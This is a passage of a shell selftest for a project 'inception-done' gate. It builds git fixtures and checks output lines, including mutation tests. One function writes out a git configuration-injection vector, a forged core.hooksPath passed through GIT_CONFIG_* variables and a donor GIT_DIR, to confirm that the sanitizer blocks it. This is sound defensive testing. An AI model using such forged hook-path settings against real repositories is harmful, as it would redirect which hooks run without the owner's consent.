  _bpw_reg "$d" branch-protection-plan @jdoe "$_bpD0" "$_bpD60"
  _bpw_mut "$d" plancond '/# MUT-BPPLAN$/s/.*/             if true; then/' "FAIL: branch protection — GitHub state unverifiable" "WAIVED: branch protection"
  echo "--- (bpw10) mutant: the checker's return ignored -> the no-row cell (bpw2) must red ---"
  d=$(_bpw_fix bpw10); rm -f "$d/WAIVER-REGISTER.md"
  _bpw_mut "$d" ignorerc '/# MUT-BPRC$/s#.*#               if _bpw=$(sh "$WAIVERS_SH" --active branch-protection-plan ./WAIVER-REGISTER.md 2>/dev/null || true); then#' "FAIL: branch protection — GitHub state unverifiable" "WAIVED: branch protection"
  echo "--- (bpw11) mutant: NOT ENFORCED dropped from the WAIVED line -> the waived cell (bpw1) must red ---"
  d=$(_bpw_fix bpw11); _bpw_reg "$d" branch-protection-plan @jdoe "$_bpD0" "$_bpD60"
  _bpw_mut "$d" notenforced '/# MUT-BPNE$/s/NOT ENFORCED: //' "WAIVED: branch protection — NOT ENFORCED" "WAIVED: branch protection — this plan cannot enforce"
  echo "--- (bpw12) mutant: the waiver sets fail=1 beside _bpwaived=1 -> the waived run's verdict must flip from OK to FAIL (green baseline only) ---"
  if [ "$_bpw_base_rc" = 0 ]; then
    d=$(_bpw_fix bpw12); _bpw_reg "$d" branch-protection-plan @jdoe "$_bpD0" "$_bpD60"
    _bpw_mut "$d" waivedfail '/# MUT-BPFAIL$/s/_bpwaived=1 .*/_bpwaived=1; fail=1   # MUT-BPFAIL/' "OK: Inception-Done gate satisfied" "FAIL: Inception-Done gate not satisfied"
    # the kill must come from the mutated line: the waiver still fired in the mutant, and no branch-protection FAIL line explains the red
    st_has "WAIVED: branch protection — NOT ENFORCED"; st_hasnt "FAIL: branch protection"
  else
    echo "selftest n/a: (bpw12) skipped — the waived-fail mutant needs a green baseline on this tree (baseline rc $_bpw_base_rc)"
  fi

  # (n1)-(n3) decided-not-present legs (INCEPTION-DONE-DECIDED-NOT-PRESENT). Load-bearing negatives:
  # the §1 Overview template placeholder and the unfilled example ADR-000 must each red STRICT; an
  # absent ADR reds too; (n3) proves surface stays green on both (incept's own post-scaffold verify
  # must not red on the judgment steps it tells the adopter are still theirs).
  echo "--- (n1) strict: charter placeholder present -> FAIL ---"
  d=$(st_mkfix n1 claude-code); st_install_hook "$d"
  printf '%s\n' '**Problem:** [what problem this solves, for whom]' >> "$d/CLAUDE.md"
  st_run "$d"
  st_has "FAIL: charter undecided"
  st_hasnt "PASS: charter decided"
  st_rc 1
  echo "--- (n2) strict: ADR-000 still the unfilled example -> FAIL; absent -> FAIL ---"
  d=$(st_mkfix n2 claude-code); st_install_hook "$d"
  st_run "$d"
  st_has "PASS: charter decided"
  st_has "PASS: stack decision recorded"
  st_undecided_adr "$d"
  st_run "$d"
  st_has "FAIL: stack decision unrecorded"
  st_has "unfilled example"
  st_hasnt "PASS: stack decision recorded"
  st_rc 1
  rm -f "$d/docs/architecture/ADR-000-stack.md"
  st_run "$d"
  st_has "FAIL: stack decision unrecorded"
  st_has "absent"
  st_rc 1
  echo "--- (n3) surface: both undecided -> these legs defer, no FAIL from them ---"
  d=$(st_mkfix n3 claude-code); st_install_hook "$d"
  printf '%s\n' '**Problem:** [what problem this solves, for whom]' >> "$d/CLAUDE.md"
  st_undecided_adr "$d"
  st_run "$d" surface
  st_hasnt "FAIL: charter undecided"
  st_hasnt "FAIL: stack decision"
  st_has "deferred to strict"

  # (s2) SWAS-769 — the first-deploy set never changes the loop-entry verdict. Unlike every cell above, s2a asserts the
  # WHOLE verdict, so its fixture builds its own world: md declared with its own BACKLOG.md, the decided ADR-000 st_mkfix
  # writes, no remote, no deploy surface (the provenance leg reads N/A) and a data surface (.env.example names a database),
  # so bia and rb-dr are in play. `owed` carries every template placeholder the OWED section reads; `filled` carries none.
  _s2_fix() { # <name> <owed|filled> -> a fixture whose first-slice legs are all met
    _s2f=$(st_mkfix "$1" claude-code); st_install_hook "$_s2f"; st_norem "$_s2f"
    rm -f "$_s2f/.github/workflows/tracker-live.yml" "$_s2f/.github/workflows/adopter-tracker-gates.yml" "$_s2f/Dockerfile"
    # The harness-adapter leg is not what s2a tests: stub it green (the st_bpstub pattern), since st_mkfix's CLAUDE.md has no section for its entry-contract lock.
    printf '#!/bin/sh\nexit 0\n' > "$_s2f/conformance/harness-adapter.sh"; chmod +x "$_s2f/conformance/harness-adapter.sh"
    # ci.yml is export-ignored in an adopter export, so the CI leg needs its own minimal non-deploy workflow.
    if [ ! -f "$_s2f/.github/workflows/ci.yml" ]; then
      mkdir -p "$_s2f/.github/workflows"
      printf 'name: ci\non: [push]\njobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo ok\n' > "$_s2f/.github/workflows/ci.yml"
    fi
    printf '%s\n' '- **Backlog backend** (§6): md' >> "$_s2f/CLAUDE.md"
    printf '# Backlog\n' > "$_s2f/BACKLOG.md"
    printf 'DATABASE_URL=postgres://localhost/fixture\n' > "$_s2f/.env.example"
    if [ "$2" = owed ]; then
      printf '%s\n' '- **SLO / error-budget posture** (§9): [soft track-and-guide / hard-gating]' '- **Environments**: Dev to Prod: [per-tier deploy trigger]' '| On-call / operator | [...] |' >> "$_s2f/CLAUDE.md"
      printf '%s\n' 'Steps: `[deploy command(s)]`' 'Command: `[rollback command]`' '**RPO:** [< 24h default]' 'Error tracking: [tool/link]' > "$_s2f/RUNBOOK.md"
      rm -f "$_s2f/docs/continuity/BIA.md"
    else
      printf '%s\n' '- **SLO / error-budget posture** (§9): soft track-and-guide' '- **Environments**: Dev to Prod: merge to main deploys Dev' '| On-call / operator | the fixture owner |' >> "$_s2f/CLAUDE.md"
      printf '%s\n' 'Steps: `make deploy`' 'Command: `make rollback`' '**RPO:** 24h' 'Error tracking: fixture-tracker' > "$_s2f/RUNBOOK.md"
      mkdir -p "$_s2f/docs/continuity"; printf '# BIA\n' > "$_s2f/docs/continuity/BIA.md"
    fi
    printf '%s' "$_s2f"
  }
  _s2_owedhas() { # the eight OWED lines, each in <state>
    st_has "OWED (first-deploy set): slo — $1 — CLAUDE.md"
    st_has "OWED (first-deploy set): envs — $1 — CLAUDE.md"
    st_has "OWED (first-deploy set): oncall — $1 — CLAUDE.md"
    st_has "OWED (first-deploy set): bia — $1 — docs/continuity/BIA.md"
    st_has "OWED (first-deploy set): rb-deploy — $1 — RUNBOOK.md"
    st_has "OWED (first-deploy set): rb-rollback — $1 — RUNBOOK.md"
    st_has "OWED (first-deploy set): rb-dr — $1 — RUNBOOK.md"
    st_has "OWED (first-deploy set): rb-monitor — $1 — RUNBOOK.md"
  }
  echo "--- (s2a) surface: every first-slice leg met, every first-deploy item owed -> the whole verdict is OK ---"
  d=$(_s2_fix s2a owed)
  st_run "$d" surface
  st_has "OK: Inception-Done gate satisfied"; st_hasnt "FAIL:"; st_rc 0
  _s2_owedhas owed
  _s2_osurf=$OUT
  echo "--- (s2a′) strict, no remote: exactly two FAIL lines (the no-remote protection leg and the closing summary), still owed ---"
  st_run "$d" strict
  st_has "FAIL: branch protection — no remote configured"; st_has "FAIL: Inception-Done gate not satisfied"; st_rc 1
  _s2_nfail=$(printf '%s\n' "$OUT" | grep -c '^FAIL' || true)
  if [ "$_s2_nfail" = 2 ]; then printf '    ok  : exactly 2 FAIL lines\n'; else printf '    BAD : %s FAIL lines (wanted exactly 2)\n' "$_s2_nfail"; st_fail=1; fi
  _s2_owedhas owed
  _s2_ostrict=$OUT
  echo "--- (s2b) strict, all eight filled, the pre-push hook removed -> the hook FAIL stands (nothing compensates) ---"
  d=$(_s2_fix s2b filled); rm -f "$d/.git/hooks/pre-push"
  st_run "$d" strict
  st_has "FAIL: pre-push git hook missing"; st_has "FAIL: Inception-Done gate not satisfied"; st_rc 1
  _s2_owedhas filled
  st_hasnt " — owed — "
  echo "--- (s2c) the OWED lines hold no FAIL, in either mode: eight lines each, none with FAIL ---"
  for _s2_o in "$_s2_osurf" "$_s2_ostrict" "$OUT"; do
    _s2_ln=$(printf '%s\n' "$_s2_o" | grep -c '^OWED (first-deploy set): ' || true)
    _s2_lf=$(printf '%s\n' "$_s2_o" | grep '^OWED (first-deploy set): ' | grep -c 'FAIL' || true)
    if [ "$_s2_ln" = 8 ] && [ "$_s2_lf" = 0 ]; then printf '    ok  : 8 OWED lines, none with FAIL\n'; else printf '    BAD : %s OWED lines, %s with FAIL (wanted 8 and 0)\n' "$_s2_ln" "$_s2_lf"; st_fail=1; fi
  done
  echo "--- (s2d) START-HERE's two tagged lists name the same ids as the gate's two lists ---"
  _s2_sh="$ROOT/START-HERE.md"; _s2_dp="$ROOT/DEVELOPMENT-PROCESS.md"
  if [ ! -f "$_s2_sh" ] || [ ! -f "$_s2_dp" ]; then
    echo "selftest n/a: (s2d) skipped — START-HERE.md or DEVELOPMENT-PROCESS.md is not in this tree"
  else
    _s2_sec() { # <heading prefix> -> that list's checklist lines
      awk -v h="$1" 'index($0, h) == 1 { f = 1; next } /^### / { f = 0 } f && /^- \[[ x]\] /' "$_s2_sh"
    }
    _s2_tags() { # <heading prefix> -> one id per line; BADLINES:<n> when a line does not carry exactly one tag
      _s2_sec "$1" | awk '{ n = gsub(/\(id: [a-z0-9-]+\)/, "&"); if (n != 1) bad++; if (match($0, /\(id: [a-z0-9-]+\)/)) print substr($0, RSTART + 5, RLENGTH - 6) } END { if (bad) print "BADLINES:" bad }'
    }
    _s2_hs='### Before your first slice'; _s2_hd='### Before your first production deploy'
    _s2_gs=$(_s2_tags "$_s2_hs" | sort); _s2_gd=$(_s2_tags "$_s2_hd" | sort)
    _s2_ws=$(printf '%s\n' $ID_FIRST_SLICE_IDS | sort); _s2_wd=$(printf '%s\n' $ID_FIRST_DEPLOY_IDS | sort)
    if [ -n "$_s2_gs" ] && [ "$_s2_gs" = "$_s2_ws" ]; then printf '    ok  : first-slice tags equal the gate list\n'; else printf '    BAD : first-slice tags [%s] differ from the gate list [%s]\n' "$_s2_gs" "$_s2_ws"; st_fail=1; fi
    if [ -n "$_s2_gd" ] && [ "$_s2_gd" = "$_s2_wd" ]; then printf '    ok  : first-deploy tags equal the gate list\n'; else printf '    BAD : first-deploy tags [%s] differ from the gate list [%s]\n' "$_s2_gd" "$_s2_wd"; st_fail=1; fi
    _s2_dup=$(printf '%s\n%s\n' "$_s2_gs" "$_s2_gd" | sort | uniq -d)
    if [ -z "$_s2_dup" ]; then printf '    ok  : no tag appears under both lists\n'; else printf '    BAD : tag(s) under both lists [%s]\n' "$_s2_dup"; st_fail=1; fi
    _s2_sl=$(_s2_sec "$_s2_hs"); _s2_dl=$(_s2_sec "$_s2_hd")
    _s2_item6=$(grep -F '**Per-project configuration** —' "$_s2_dp" | head -1)
    for _s2_fld in 'backlog backend' 'autonomy-tier' 'SLO' 'review routing' 'WIP' 'environments'; do
      case "$_s2_item6" in *"$_s2_fld"*) _s2_in6=yes ;; *) _s2_in6=no ;; esac
      _s2_cnt=0
      case "$_s2_sl" in *"$_s2_fld"*) _s2_cnt=$((_s2_cnt + 1)) ;; esac
      case "$_s2_dl" in *"$_s2_fld"*) _s2_cnt=$((_s2_cnt + 1)) ;; esac
      if [ "$_s2_in6" = yes ] && [ "$_s2_cnt" = 1 ]; then printf '    ok  : item-6 field [%s] is in exactly one list\n' "$_s2_fld"; else printf '    BAD : item-6 field [%s]: named in DEVELOPMENT-PROCESS item 6 = %s, in %s of the two lists (wanted yes and 1)\n' "$_s2_fld" "$_s2_in6" "$_s2_cnt"; st_fail=1; fi
    done
  fi
  echo "--- (s2e) every placeholder token the OWED section reads is still in its template ---"
  _s2_tc="$ROOT/templates/PROJECT-CLAUDE-TEMPLATE.md"; _s2_tr="$ROOT/templates/RUNBOOK-TEMPLATE.md"
  if [ ! -f "$_s2_tc" ] || [ ! -f "$_s2_tr" ]; then
    echo "selftest n/a: (s2e) skipped — a template is not in this tree"
  else
    for _s2_id in $ID_FIRST_DEPLOY_IDS; do
      _id_owed_spec "$_s2_id" || { printf '    BAD : [%s] has no spec in _id_owed_spec\n' "$_s2_id"; st_fail=1; continue; }
      [ "$_s2_id" = bia ] && continue   # a file-absent read: no placeholder token to mirror
      case "$_id_owf" in CLAUDE.md) _s2_tpl=$_s2_tc ;; *) _s2_tpl=$_s2_tr ;; esac
      if [ -n "$_id_owt" ] && grep -qF -e "$_id_owt" "$_s2_tpl"; then printf '    ok  : [%s] token is in %s\n' "$_s2_id" "${_s2_tpl##*/}"; else printf '    BAD : [%s] token [%s] is not in %s (a reworded template would read every item as filled)\n' "$_s2_id" "$_id_owt" "${_s2_tpl##*/}"; st_fail=1; fi
    done
  fi

  # (dr) SWAS-779 — the inception-drafts leg. Strict fails on a docs/inception-draft/ directory or on the draft banner (a whole line) in any of
  # the four ratified files; --surface reports each as OWED and does not fail on it. A missing file is no banner; an unreadable one fails.
  _dr_ban=$ID_DRAFT_BANNER
  _dr_ban2=$ID_DRAFT_BANNER_OWNER
  _dr_fix() { # <name> -> a fixture with no draft directory and no banner anywhere
    _drx_p=$(st_mkfix "$1" claude-code); st_install_hook "$_drx_p"; rm -rf "$_drx_p/docs/inception-draft"
    printf '%s' "$_drx_p"
  }
  echo "--- (dr1) strict: no draft directory, no banner -> PASS, no draft FAIL ---"
  d=$(_dr_fix dr1); st_run "$d" strict
  st_has "PASS: no inception draft remains"; st_hasnt "FAIL: inception drafts unratified"
  echo "--- (dr2) strict: docs/inception-draft/ exists -> FAIL ---"
  d=$(_dr_fix dr2); mkdir -p "$d/docs/inception-draft"; printf 'x\n' > "$d/docs/inception-draft/CHARTER.md"
  st_run "$d" strict
  st_has "FAIL: inception drafts unratified — docs/inception-draft/ still exists"; st_hasnt "PASS: no inception draft remains"
  st_has "FAIL: Inception-Done gate not satisfied"; st_rc 1
  echo "--- (dr3) strict: the banner line in each of the four ratified files -> FAIL naming that file ---"
  _drc_i=0
  for _drc_n in CLAUDE.md docs/architecture/ADR-000-stack.md RUNBOOK.md BACKLOG.md; do
    _drc_i=$((_drc_i + 1))
    d=$(_dr_fix "dr3-$_drc_i"); printf '%s\n' "$_dr_ban" >> "$d/$_drc_n"
    st_run "$d" strict
    st_has "FAIL: inception drafts unratified — $_drc_n still carries the draft banner line"; st_hasnt "PASS: no inception draft remains"
    st_has "FAIL: Inception-Done gate not satisfied"; st_rc 1
  done
  echo "--- (dr4) strict: the banner text inside a longer line, or a reworded banner, is not the whole line -> no draft FAIL ---"
  d=$(_dr_fix dr4)
  printf 'note: %s\n%s trailing words\n> **DRAFT: reworded by hand.**\n' "$_dr_ban" "$_dr_ban" > "$d/RUNBOOK.md"
  st_run "$d" strict
  st_has "PASS: no inception draft remains"; st_hasnt "FAIL: inception drafts unratified"
  echo "--- (dr5) strict: no BACKLOG.md (a tracker-backed board) is no banner -> no draft FAIL ---"
  d=$(_dr_fix dr5); rm -f "$d/BACKLOG.md"
  st_run "$d" strict
  st_has "PASS: no inception draft remains"; st_hasnt "FAIL: inception drafts unratified"; st_hasnt "could not be read"
  echo "--- (dr6) strict: an unreadable RUNBOOK.md -> FAIL (not shown free of the banner) ---"
  d=$(_dr_fix dr6); chmod 000 "$d/RUNBOOK.md"
  if [ -r "$d/RUNBOOK.md" ]; then
    echo "selftest n/a: (dr6) skipped — this user reads a mode 000 file (root)"
  else
    st_run "$d" strict
    st_has "FAIL: inception drafts unratified — RUNBOOK.md could not be read"; st_hasnt "PASS: no inception draft remains"
    st_has "FAIL: Inception-Done gate not satisfied"; st_rc 1
  fi
  chmod 644 "$d/RUNBOOK.md" 2>/dev/null || true
  echo "--- (dr7) surface: a draft directory and a banner are OWED lines, never a FAIL ---"
  d=$(_dr_fix dr7); mkdir -p "$d/docs/inception-draft"; printf '%s\n' "$_dr_ban" >> "$d/RUNBOOK.md"
  st_run "$d" surface
  st_has "OWED (inception drafts): docs/inception-draft/ still exists"
  st_has "OWED (inception drafts): RUNBOOK.md still carries the draft banner line"
  st_hasnt "FAIL: inception drafts unratified"
  d=$(_dr_fix dr7b); st_run "$d" surface
  st_has "surface: no inception draft present"; st_hasnt "OWED (inception drafts)"
  echo "--- (dr8) the template's banner line is the hard-coded literal (a reworded template would disarm the leg) ---"
  _dr_tp="$ROOT/templates/INCEPTION-DRAFT-TEMPLATE.md"
  if [ ! -f "$_dr_tp" ]; then
    echo "selftest n/a: (dr8) skipped — templates/INCEPTION-DRAFT-TEMPLATE.md is not in this tree"
  else
    # SWAS-907: the template carries exactly two banner lines, the first then the owner's-words one, each equal to its literal.
    _dr_tl=$(grep -F -e '> **DRAFT:' "$_dr_tp" || true)
    _dr_tw=$(printf '%s\n%s' "$_dr_ban" "$_dr_ban2")
    if [ "$_dr_tl" = "$_dr_tw" ]; then printf '    ok  : the template carries the two banner lines, each equal to its literal\n'; else printf '    BAD : the template banner lines [%s] differ from the two literals (or it holds another such line)\n' "$_dr_tl"; st_fail=1; fi
  fi
  echo "--- (dr14) strict: a ratified file carrying the SECOND banner (owner's words) -> FAIL naming that file (SWAS-907 C5) ---"
  d=$(_dr_fix dr14); printf '%s\n' "$_dr_ban2" >> "$d/CLAUDE.md"
  st_run "$d" strict
  st_has "FAIL: inception drafts unratified — CLAUDE.md still carries the draft banner line"; st_hasnt "PASS: no inception draft remains"
  st_has "FAIL: Inception-Done gate not satisfied"; st_rc 1
  d=$(_dr_fix dr14b); printf '%s\r\n' "$_dr_ban2" > "$d/RUNBOOK.md"
  st_run "$d" strict
  st_has "FAIL: inception drafts unratified — RUNBOOK.md still carries the draft banner line"; st_hasnt "PASS: no inception draft remains"; st_rc 1
  d=$(_dr_fix dr14c); printf 'note: %s\n' "$_dr_ban2" > "$d/RUNBOOK.md"
  st_run "$d" strict
  st_has "PASS: no inception draft remains"; st_hasnt "FAIL: inception drafts unratified"
  echo "--- (dr12) strict: a CRLF file carrying the banner, and a banner with spaces around it -> FAIL ---"
  d=$(_dr_fix dr12); printf '%s\r\n' "$_dr_ban" > "$d/RUNBOOK.md"
  st_run "$d" strict
  st_has "FAIL: inception drafts unratified — RUNBOOK.md still carries the draft banner line"; st_hasnt "PASS: no inception draft remains"; st_rc 1
  d=$(_dr_fix dr12b); printf '  %s   \n' "$_dr_ban" > "$d/RUNBOOK.md"
  st_run "$d" strict
  st_has "FAIL: inception drafts unratified — RUNBOOK.md still carries the draft banner line"; st_hasnt "PASS: no inception draft remains"; st_rc 1
  echo "--- (dr13) strict: a regular FILE named docs/inception-draft -> FAIL ---"
  d=$(_dr_fix dr13); printf 'x\n' > "$d/docs/inception-draft"
  st_run "$d" strict
  st_has "FAIL: inception drafts unratified — docs/inception-draft/ still exists"; st_hasnt "PASS: no inception draft remains"; st_rc 1
  echo "--- (dr9) mutant: the draft-directory test dropped -> the directory cell (dr2) must red ---"
  d=$(_dr_fix dr9); mkdir -p "$d/docs/inception-draft"; printf 'x\n' > "$d/docs/inception-draft/CHARTER.md"
  _bpw_mut "$d" drdir '/# MUT-DRDIR$/s/.*/if false; then :; fi/' "FAIL: inception drafts unratified — docs/inception-draft/ still exists" "PASS: no inception draft remains"
  echo "--- (dr10) mutant: the whole-line anchor dropped -> the longer-line cell (dr4) must red ---"
  d=$(_dr_fix dr10); printf 'note: %s\n' "$_dr_ban" > "$d/RUNBOOK.md"
  _bpw_mut "$d" dranchor '/# MUT-DRBANNER$/s/grep -qxF/grep -qF/' "PASS: no inception draft remains" "FAIL: inception drafts unratified — RUNBOOK.md still carries"
  echo "--- (dr11) mutant: an unreadable file read as clean -> the unreadable cell (dr6) must red ---"
  d=$(_dr_fix dr11); chmod 000 "$d/RUNBOOK.md"
  if [ -r "$d/RUNBOOK.md" ]; then
    echo "selftest n/a: (dr11) skipped — this user reads a mode 000 file (root)"
  else
    _bpw_mut "$d" drunread '/# MUT-DRUNREAD$/s/.*/    *) : ;;/' "FAIL: inception drafts unratified — RUNBOOK.md could not be read" "PASS: no inception draft remains"
  fi
  chmod 644 "$d/RUNBOOK.md" 2>/dev/null || true

  echo "--- (b10) sanitizer: a forged prefix over an EXPORTED triad, under bash-as-/bin/sh ---"
  selftest_sanitizer_bash_unset

  rm -rf "$WORK" 2>/dev/null || true
  if [ "$st_fail" = 0 ]; then
    echo "inception-done --selftest: OK"; return 0
  fi
  echo "inception-done --selftest: FAIL" >&2; return 1
}

# ── selftest_sanitizer_bash_unset : the BASH-AS-/bin/sh regression lock for _id_git
# (SANITIZER-UNSET-RESTORES-EXPORTED). It extracts the SHIPPED sanitizer from this very file (so it
# grades the deployed text, not a copy) and runs it under `bash` with the hermetic lane's face-(a)
# triad EXPORTED and a forged `core.hooksPath` applied as a TEMPORARY PREFIX on a function call —
# exactly the shape fixture (b7) uses. In bash-as-/bin/sh, `unset` of a variable that carried a prefix
# assignment over an ALREADY-EXPORTED one RESTORES the exported value instead of removing it, so an
# `unset`-based sanitizer lets the forged GIT_CONFIG_KEY_0 through and the probe prints `hooks`.
# ⚠️ Under `dash` this leg is TAUTOLOGICAL (dash's unset removes the variable outright); it is kept
# and run under `bash` EXPLICITLY because macOS /bin/sh IS bash 3.2 and CI's per-PR hermetic face
# runs these selftests under the face-(a) environment. HOME/XDG_CONFIG_HOME are pointed at the
# throwaway dir because the sanitizer deliberately does NOT strip them (see _id_git's header).
selftest_sanitizer_bash_unset() {
  if ! command -v bash >/dev/null 2>&1; then
    echo "selftest SKIP: sanitizer bash-as-sh leg (no bash on PATH — the regression it locks is bash-only)"
    return 0
  fi
  _sbu_d=$(mktemp -d) || { echo "selftest FAIL: sanitizer bash-as-sh leg — no tmpdir"; st_fail=1; return 1; }
  git -C "$_sbu_d" init -q >/dev/null 2>&1 || true
  # Anchored on the OPENING (security L2; `/^_id_git/` starts at any column-0 line with that prefix).
  # TWO VECTORS (review I-1): the config-injection triad AND the LOCATOR pair — GIT_DIR/GIT_WORK_TREE
  # at a DONOR repo whose own config carries core.hooksPath — each ambient-exported and re-applied as the temporary prefix that `unset` restores. Either leak prints a value; a clean run prints nothing.
  _sbu_src=$(awk '/^_id_git\(\) \{/,/^}$/' "$0")
  _sbu_dn=$_sbu_d/donor; { git init -q "$_sbu_dn" && git -C "$_sbu_dn" config core.hooksPath DONOR; } >/dev/null 2>&1 || true
  # `|| true`: a sanitized `git config --get` of an ABSENT key exits 1 — which is the PASSING case
  # here — so the assignment's own status is never the verdict (and never trips a caller's `set -e`).
  _sbu_out=$( cd "$_sbu_d" && HOME="$_sbu_d" XDG_CONFIG_HOME="$_sbu_d" \
      GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=user.useConfigOnly GIT_CONFIG_VALUE_0=true \
      GIT_DIR="$_sbu_dn/.git" GIT_WORK_TREE="$_sbu_dn" \
      bash -c "$_sbu_src
_sbu_probe() { _id_git config --get core.hooksPath; }
GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=core.hooksPath GIT_CONFIG_VALUE_0=hooks _sbu_probe
GIT_DIR='$_sbu_dn/.git' GIT_WORK_TREE='$_sbu_dn' _sbu_probe" 2>&1 ) || true
  rm -rf "$_sbu_d" 2>/dev/null || true
  if [ -z "$_sbu_out" ]; then
    echo "selftest PASS: _id_git neutralizes a forged prefix-over-exported GIT_CONFIG triad AND GIT_DIR/GIT_WORK_TREE locator pair (bash-as-/bin/sh; tautological under dash)"
    return 0
  fi
  echo "selftest FAIL: _id_git let a forged core.hooksPath through under bash-as-/bin/sh -> [$_sbu_out]"
  st_fail=1
  return 1
}

# ── seed_fixture_template <root> <dest> : build a committed fixture-template repo at <dest> from
#    <root>, so st_mkfix can cheaply re-clone it. Lives BELOW the oracle marker (never mutated). It
#    chooses clone-vs-worktree-seed across THREE cases:
#      1. HEAD tracks hooks/pre-push (the kit repo; the exported tree adopter-export-wired.sh
#         init+add+commits before the aggregate) -> `git clone` copies the committed content. Proven;
#         what CI has always exercised.
#      2. No commit yet (CP-5: a freshly incepted adopter — incept git-inits but does NOT commit) ->
#         `git clone` would copy an EMPTY template, so every fixture assertion silently missed and this
#         selftest reddened inside every adopter tree. Seed from the WORKING TREE instead.
#      3. K9 — a commit EXISTS but is a PRE-INCEPT HEAD that does not reflect the incepted worktree
#         (it lacks hooks/pre-push + adapters/). `git clone` would copy that INCOMPLETE tree, so the
#         fixtures would silently lack hooks/pre-push and assertions would miss. So we gate the clone
#         path on HEAD actually TRACKING hooks/pre-push (`git cat-file -e HEAD:hooks/pre-push` — the
#         incepted-marker probe), NOT merely on HEAD existing, and fall back to the SAME worktree-seed
#         as case 2. The worktree is the truth; the `hooks/pre-push absent` guard below keeps the
#         fallback fail-closed.
#    An earlier revision of the CP-5 fix copied the worktree UNCONDITIONALLY with `tar --exclude='./.git'`.
#    That passed on macOS and FAILED on Linux CI (BSD vs GNU tar disagree on the exclude), breaking
#    adopter-export-wired's selftest. The non-vacuity sweep caught it. The worktree path below uses a
#    portable `find` walk instead — no tar. Do not reintroduce tar here.
seed_fixture_template() {
  _sft_root="$1"; _sft_dest="$2"
  # K9: gate the clone fast-path on HEAD actually TRACKING hooks/pre-push (the incepted-marker probe),
  # NOT merely on HEAD existing. A pre-incept HEAD exists but does not track hooks/pre-push, so `git
  # cat-file -e HEAD:hooks/pre-push` is false and the `&&` falls through to the worktree-seed below.
  if git -C "$_sft_root" rev-parse --verify -q HEAD >/dev/null 2>&1 \
     && git -C "$_sft_root" cat-file -e HEAD:hooks/pre-push 2>/dev/null; then
    if ! git clone -q "$_sft_root" "$_sft_dest" 2>/dev/null; then
      echo "inception-done --selftest: FAIL — cannot clone the kit repo from $_sft_root (fixtures need a real git tree)"
      return 1
    fi
  else
    # Seed the template from the WORKING TREE, then init+commit it so st_mkfix can clone it exactly.
    mkdir -p "$_sft_dest"
    ( cd "$_sft_root" && find . -name .git -prune -o -type f -print ) | while IFS= read -r _f; do
      _rel=${_f#./}
      mkdir -p "$_sft_dest/$(dirname "$_rel")" 2>/dev/null || continue
      cp "$_sft_root/$_rel" "$_sft_dest/$_rel" 2>/dev/null || true
    done
    if [ ! -f "$_sft_dest/hooks/pre-push" ]; then
      echo "inception-done --selftest: FAIL — cannot seed fixtures from $_sft_root (hooks/pre-push absent)"
      return 1
    fi
    if ! git -C "$_sft_dest" init -q \
       || ! git -C "$_sft_dest" add -A \
       || ! git -C "$_sft_dest" -c user.email=selftest@kit -c user.name=selftest commit -qm fixtures; then
      echo "inception-done --selftest: FAIL — cannot seed the fixture template repo"
      return 1
    fi
  fi
}

# ── st_* helpers + the st_fail accumulator: BELOW the oracle marker (never mutated). ────────────
# st_run <dir>: capture run_gate's combined output in OUT and its return in RC (subshelled so its
#   `cd "$DIR"` does not move the selftest's own working directory).
st_run() { OUT=$( ( MODE="${2:-strict}" run_gate "$1" ) 2>&1 ); RC=$?; }
# st_real <dir> <strict|surface>: the REAL entry — this script run as `sh "$0" <dir> [--surface]`, with set -e live (st_run calls
#   run_gate in the selftest's own `set +e` shell and cannot see an abort). The provenance leg reads INCEPTION_DONE_GH_CMD.
st_real() { OUT=$( INCEPTION_DONE_GH_CMD="$_pub_stub" sh "$0" "$1" ${2:+--$2} 2>&1 ); RC=$?; }
# st_has <substr>: OUT must contain <substr>. st_hasnt: OUT must NOT. st_rc <n>: RC must equal <n>.
st_has()   { case "$OUT" in *"$1"*) printf '    ok  : has [%s]\n' "$1" ;; *) printf '    BAD : MISSING [%s]\n' "$1"; st_fail=1 ;; esac; }
st_hasnt() { case "$OUT" in *"$1"*) printf '    BAD : SHOULD-NOT have [%s]\n' "$1"; st_fail=1 ;; *) printf '    ok  : absent [%s]\n' "$1" ;; esac; }
st_rc()    { if [ "$RC" = "$1" ]; then printf '    ok  : rc %s\n' "$RC"; else printf '    BAD : rc %s (wanted %s)\n' "$RC" "$1"; st_fail=1; fi; }
# st_mkfix <name> <harness>: echo the path to a fresh project fixture that (before perturbation)
#   satisfies every leg — a cheap local re-clone of the once-cloned template, with the four adopter
#   files stamped and CLAUDE.md carrying real (non-placeholder) header fields + the harness value.
st_mkfix() {
  _d="$WORK/$1"
  git clone -q "$WORK/tmpl" "$_d"
  : > "$_d/ENGINEERING-PRINCIPLES.md"; : > "$_d/RUNBOOK.md"; : > "$_d/.env.example"
  {
    echo "# Fixture project"
    echo "**Project:** fixture-project"
    echo "**Intent owner:** the fixture owner"
    echo "- **Target harness(es)** (§harness-neutrality): $2"
  } > "$_d/CLAUDE.md"
  # decided-not-present legs: the template clone carries the kit's UNFILLED example ADR-000, which the
  # strict gate reds by design — give every fixture a decided one; (n1)/(n2)/(n3) undo this deliberately.
  mkdir -p "$_d/docs/architecture"
  printf '# ADR-000\n\n## Fit rationale\nteam skills and ecosystem fit for this workload.\n' > "$_d/docs/architecture/ADR-000-stack.md"
  printf '%s' "$_d"
}
# st_undecided_adr <dir>: put the UNFILLED example back (bracketed body carrying the engine's sentinel)
st_undecided_adr() { printf '# ADR-000\n\n## Fit rationale\n[why this stack fits THIS problem — cite the fit dimensions]\n' > "$1/docs/architecture/ADR-000-stack.md"; }
st_install_hook() { cp "$1/hooks/pre-push" "$1/.git/hooks/pre-push"; chmod +x "$1/.git/hooks/pre-push"; }
# st_tracked <dir>: switch the fixture to TRACKED-HOOKS mode (Δ6) — remove any installed copy (this
#   mode's green must come from the tracked file alone) and point core.hooksPath at the tree's own
#   hooks/ dir. Set INSIDE this script's own process: that key is human-gated by the agent guard, so
#   fixtures build it here rather than from an agent's shell.
st_tracked() { rm -f "$1/.git/hooks/pre-push"; git -C "$1" config core.hooksPath hooks; }
# ── branch-protection leg fixtures (K5). st_gh/st_nongh/st_norem set the origin host; st_bpstub
#    swaps in a branch-protection.sh returning a fixed exit; st_attest stamps a non-GitHub attestation.
st_gh()     { git -C "$1" remote add origin https://github.com/fixture/repo.git 2>/dev/null || git -C "$1" remote set-url origin https://github.com/fixture/repo.git; }
